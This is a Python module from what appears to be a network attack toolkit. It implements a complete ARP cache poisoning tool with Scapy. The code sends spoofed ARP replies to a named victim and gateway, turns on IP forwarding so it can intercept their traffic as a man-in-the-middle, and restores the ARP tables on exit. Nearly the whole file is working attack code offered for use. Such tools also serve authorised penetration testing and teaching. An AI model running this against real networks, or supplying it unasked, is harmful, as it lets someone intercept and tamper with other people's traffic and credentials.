"""
Author: Chris Martinez
Date: 25 May 2026
Version: 1.0.0
Name: __init__.py (arp_spoof)
Description: This module performs ARP cache poisoning to position the attacker 
as a man-in-the-middle between a target host and the network gateway. It
continuously sends spoofed ARP replies to both the victim and the gateway
causing each to associate the attacker's MAC address with the other's IP
address. Supports one-way poisoning for passive observation, automatic IP
forwarding to maintain victim connectivity, and clean ARP table restoration
on exit.
"""
import argparse
import ipaddress
import itertools
import platform
import subprocess
import signal
import sys
import time

from scapy.all import get_if_hwaddr, sendp, srp
from scapy.layers.l2 import Ether, ARP
from types import FrameType

from netlink.core.base_module import BaseModule
from netlink.core.output import OutputManager


class ARPSpoofer(BaseModule):
    """
    The ARPSpoofer class performs ARP cache poisoning attacks by sending
    spoofed ARP reply packets to a target host and optionally the network
    gateway. It maintains a continuous poison loop that keeps both ARP caches
    updated with the attacker's MAC address preventing cache expiry from
    restoring the original mappings. Automatically enables IP forwarding on
    the host OS to ensure intercepted traffic is forwarded rather than dropped
    preserving the victim's network connectivity during the attack. On exit
    the module restores the original ARP mappings by sending gratuitous ARP
    replies with the correct MAC addresses to both the victim and gateway
    cleaning up the attack artifacts. Supports Linux and macOS.
    """
    ############################################################################
    # Class Level Attributes
    ############################################################################
    NAME = "arp_spoof"
    DESCRIPTION = "Perform ARP poisoning for MITM positioning"
    REQUIRES_ROOT = True

    ARP_REQUEST = 1
    ARP_REPLY = 2
    BROADCAST = "ff:ff:ff:ff:ff:ff"

    
    ############################################################################
    # Constructor
    ############################################################################
    def __init__(self, iface: str, output: OutputManager):
        super().__init__(iface, output)
        self.keyboard_interrupted = False
        self.LINUX = False
        self.MAC = False

    ############################################################################
    # Abstract Required Methods
    ############################################################################
    def add_args(self, parser: argparse.ArgumentParser) -> None:
        """
        Adds module-specific arguments to the argument parser. This method is
        called by the Engine when setting up the CLI for this module. Defines
        arguments for poison cycle count, interval between cycles, target and
        gateway IP addresses, IP forwarding control, and one-way poisoning mode.
        Args:
            parser (argparse.ArgumentParser): The argument parser to which
                                            module-specific args are added.
        """
        parser.add_argument(
            '-c',
            '--count',
            type=int,
            action='store',
            dest='count',
            default=0,
            help="Number of packets to send (Default=0 infinite)"
        )

        parser.add_argument(
            '--interval',
            type=float,
            action='store',
            dest='interval',
            default=2.0,
            help="The interval of N seconds between packets sent (Dafault=2)"
        )

        parser.add_argument(
            '-t',
            '--target',
            type=str,
            action='store',
            dest='target',
            required=True,
            help="The IP of the target to ARP spoof"
        )

        parser.add_argument(
            '-g',
            '--gateway',
            type=str,
            action='store',
            dest='gateway',
            required=True,
            help="The IP of the gateway for your ARP spoof"
        )

        parser.add_argument(
            '--disable-ip-forward',
            action='store_true',
            dest='disable_ip_forward',
            default=False,
            help="Disables automatic IP forwarding"
        )

        parser.add_argument(
            '--one-way',
            action='store_true',
            dest='one_way',
            default=False,
            help="Only spoofs the victim, not the gateway"
        )

    def run(self, args: argparse.Namespace) -> None:
        """
        Executes the main functionality of the ARPSpoofer module. Resolves MAC
        addresses for the attacker, target, and gateway using Scapy. Optionally
        enables OS-level IP forwarding to maintain victim connectivity. Runs a
        continuous poison loop sending spoofed ARP replies at the specified
        interval. On exit via Ctrl+C or count completion, restores the original
        ARP table mappings and disables IP forwarding if it was enabled.
        Args:
            args (argparse.Namespace): The parsed command-line arguments
                                    specific to the ARPSpoofer module.
        """
        my_mac = get_if_hwaddr(self.iface)
        target_mac = self._get_mac(args.target)
        gateway_mac = self._get_mac(args.gateway)

        if my_mac == None or target_mac == None or gateway_mac == None:
            msg = f"Error attempting to grab MAC Addresses"
            self.output.error(msg)
            sys.exit(1)

        if target_mac == gateway_mac:
            msg = f"Both target mac and gateway mac are the same"
            self.output.error(msg)
            sys.exit(1) 

        self._determine_OS()
        self.keyboard_interrupted = False
        signal.signal(signal.SIGINT, self._sigint_handler)
        counter = range(args.count) if args.count > 0 else itertools.count()
        forwarding_enabled = False if args.disable_ip_forward else True

        if forwarding_enabled:
            self._enable_ip_forwarding()

        try:
            msg = (
                f"Target IP: {args.target}\tTarget MAC: {target_mac}\n"
                f"Gateway IP: {args.gateway}\tGateway MAC: {gateway_mac}\n"
                f"IP forwarding "
                f"{'enabled' if forwarding_enabled else 'disabled'}\n"
                f"Starting ARP spoof..."
            )
            self.output.info(msg)

            for _ in counter:
                if self.keyboard_interrupted:
                    self.output.warn("Keyboard interrupted (CTRL+C)")
                    break
                self._poison(my_mac, target_mac, gateway_mac, args)
                time.sleep(args.interval)
        except Exception as e:
            self.output.warn(f"{e}")
        finally:
            self.output.info("Restoring ARP tables...")
            self._restore_arp_tables(my_mac, target_mac, gateway_mac, args)
            if forwarding_enabled:
                self._disable_ip_forwarding()
                self.output.success("IP forwarding disabled")
            signal.signal(signal.SIGINT, signal.SIG_DFL)
                
    def validate_args(self, args: argparse.Namespace) -> bool:
        """
        Validates the provided arguments for the ARPSpoofer module. Checks that
        target and gateway are valid IP addresses, that they are not the same 
        IP, that count is not negative, and that interval is greater than zero.
        Args:
            args (argparse.Namespace): The parsed command-line arguments
                                    specific to the ARPSpoofer module.
        Returns:
            bool: True if all arguments are valid, False otherwise.
        """
        try:
            ipaddress.ip_address(args.target)
        except ValueError:
            msg = "Provide a valid IP Address for the victim"
            self.output.error(msg)
            return False
        
        try:
            ipaddress.ip_address(args.gateway)
        except ValueError:
            msg = "Provide a valide IP Address for the gateway"
            self.output.error(msg)
            return False
        
        if args.target == args.gateway:
            msg = "Victim and Gateway IP addresses cannot be the same"
            self.output.warn(msg)
            return False
        
        if args.count < 0:
            self.output.warn("Count cannot be a negative value")
            return False
        
        if args.interval <= 0:
            self.output.warn("Interval must be greater than 0")
            return False
        
        return True
        
    ############################################################################
    # Methods
    ############################################################################
    def _determine_OS(self) -> None:
        """
        Detects the current operating system and sets the corresponding instance
        flag for use by IP forwarding methods. Sets self.LINUX to True on Linux
        systems and self.MAC to True on macOS systems. Exits with an error if
        the operating system is neither Linux nor macOS since IP forwarding
        commands differ per OS and unsupported systems cannot be handled safely.
        """
        system_os = platform.system()
        if system_os == 'Linux':
            self.LINUX = True
        elif system_os == 'Darwin':
            self.MAC = True
        else:
            msg = "You need to be on a valid Linux Distro or Mac OS system"
            self.output.error(msg)
            sys.exit(1)

    def _disable_ip_forwarding(self) -> None:
        """
        Disables IP packet forwarding on the host operating system restoring
        the original forwarding state. Called in the finally block of run() to
        ensure forwarding is always disabled when the module exits regardless
        of how it exits. Uses sysctl on both Linux and macOS with the
        appropriate kernel parameter for each platform. Output is suppressed
        to avoid cluttering the terminal.
        """
        LINUX_CMD = ['sysctl', '-w', 'net.ipv4.ip_forward=0']
        MAC_CMD = ['sysctl', '-w', 'net.inet.ip.forwarding=0']

        if self.LINUX:
            subprocess.run(LINUX_CMD, capture_output=True)
        elif self.MAC:
            subprocess.run(MAC_CMD, capture_output=True)

    def _enable_ip_forwarding(self) -> None:
        """
        Enables IP packet forwarding on the host operating system to ensure
        intercepted traffic is forwarded to its destination rather than dropped.
        Without IP forwarding enabled the victim loses network connectivity the
        moment poisoning begins. Uses sysctl on both Linux and macOS with the
        appropriate kernel parameter for each platform. Output is suppressed
        to avoid cluttering the terminal.
        """
        LINUX_CMD = ['sysctl', '-w', 'net.ipv4.ip_forward=1']
        MAC_CMD = ['sysctl', '-w', 'net.inet.ip.forwarding=1']

        if self.LINUX:
            subprocess.run(LINUX_CMD, capture_output=True)
        elif self.MAC:
            subprocess.run(MAC_CMD, capture_output=True)
    
    def _get_mac(self, ip: str) -> str|None:
        """
        Resolves the MAC address of a host on the local network by sending
        an ARP request and waiting for a reply. Unlike passive ARP cache
        lookups this method actively broadcasts an ARP request onto the
        network ensuring the MAC address is resolved even when the target
        is not in the local ARP cache. Returns None if the host does not
        respond within the timeout period.
        Args:
            ip (str): The IP address of the host to resolve.
        Returns:
            str | None: The MAC address of the host as a colon-separated
                        string e.g. '2c:c1:f4:f2:c6:50' or None if the
                        host did not respond to the ARP request.
        """
        pkt = Ether(dst=self.BROADCAST)/ARP(pdst=ip)
        answered, unanswered = srp(pkt, iface=self.iface, timeout=2, verbose=0)
        
        for _, pkt_received in answered:
            if pkt_received.haslayer(ARP):
                return pkt_received[ARP].hwsrc
            
        return None

    def _poison(self, 
                my_mac: str,
                target_mac: str,
                gateway_mac: str,
                args: argparse.Namespace) -> None:
        """
        Sends one cycle of spoofed ARP reply packets to poison the ARP caches
        of the target and optionally the gateway. Tells the victim that the
        gateway IP belongs to the attacker's MAC address and in two-way mode
        tells the gateway that the victim IP belongs to the attacker's MAC
        address. Both packets are sent at layer 2 using sendp() to ensure
        proper Ethernet framing.
        Args:
            my_mac (str): The attacker's MAC address.
            target_mac (str): The victim's MAC address.
            gateway_mac (str): The gateway's MAC address.
            args (argparse.Namespace): The parsed command-line arguments used
                                    to access target, gateway, and one_way.
        """
        spoof_gateway = False if args.one_way else True

        pkt_to_victim = Ether(
            dst=target_mac, 
            src=my_mac
        )

        pkt_to_victim /= ARP(
            op=self.ARP_REPLY, 
            hwsrc=my_mac,
            psrc=args.gateway,
            hwdst=target_mac,
            pdst=args.target
        )

        sendp(pkt_to_victim, iface=self.iface, verbose=0)
        msg = (
            f"Poisoned {args.target} -> told victim gateway is at your MAC "
            f"({my_mac})"
        )
        self.output.success(msg)

        if spoof_gateway:
            pkt_to_gateway = Ether(
                dst=gateway_mac,
                src=my_mac
            )

            pkt_to_gateway /= ARP(
                op=self.ARP_REPLY,
                hwsrc=my_mac,
                psrc=args.target,
                hwdst=gateway_mac,
                pdst=args.gateway
            )

            sendp(pkt_to_gateway, iface=self.iface, verbose=0)
            msg = (
                    f"Poisoned {args.gateway} -> told gateway victim is at "
                    f"your MAC ({my_mac})"
                )
            self.output.success(msg)

    def _restore_arp_tables(self, 
                my_mac: str,
                target_mac: str,
                gateway_mac: str,
                args: argparse.Namespace) -> None:
        """
        Restores the original ARP cache mappings on the victim and optionally
        the gateway by sending gratuitous ARP replies with the correct MAC
        addresses. Sends each restoration packet five times to ensure the
        ARP cache is updated before expiry. Called in the finally block of
        run() to ensure cleanup always occurs on exit.
        Args:
            my_mac (str): The attacker's MAC address.
            target_mac (str): The victim's MAC address.
            gateway_mac (str): The gateway's MAC address.
            args (argparse.Namespace): The parsed command-line arguments used
                                    to access target, gateway, and one_way.
        """
        spoof_gateway = False if args.one_way else True

        pkt_to_victim = Ether(
            dst=target_mac, 
            src=gateway_mac
        )

        pkt_to_victim /= ARP(
            op=self.ARP_REPLY, 
            hwsrc=gateway_mac,
            psrc=args.gateway,
            hwdst=target_mac,
            pdst=args.target
        )

        sendp(pkt_to_victim, iface=self.iface, verbose=0, count=5)
        self.output.success("Victim's ARP tables restored")

        if spoof_gateway:
            pkt_to_gateway = Ether(
                dst=gateway_mac,
                src=target_mac
            )

            pkt_to_gateway /= ARP(
                op=self.ARP_REPLY,
                hwsrc=target_mac,
                psrc=args.target,
                hwdst=gateway_mac,
                pdst=args.gateway
            )

            sendp(pkt_to_gateway, iface=self.iface, verbose=0, count=5)
            self.output.success("Gateway's ARP tables restored")

    def _sigint_handler(self, sig: int, frame: FrameType|None) -> None:
        """
        Handles the SIGINT signal generated by Ctrl+C by setting the
        keyboard_interrupted flag to True. Allows the poison loop to exit
        cleanly after the current cycle completes rather than terminating
        abruptly mid-packet. The finally block in run() handles restoration
        and cleanup after the flag is detected.
        Args:
            sig (int): The signal number received. Will be signal.SIGINT
                    when triggered by Ctrl+C.
            frame (FrameType | None): The current stack frame at the time
                                    the signal was received. Not used but
                                    required by the signal handler interface.
        """
        self.keyboard_interrupted = True
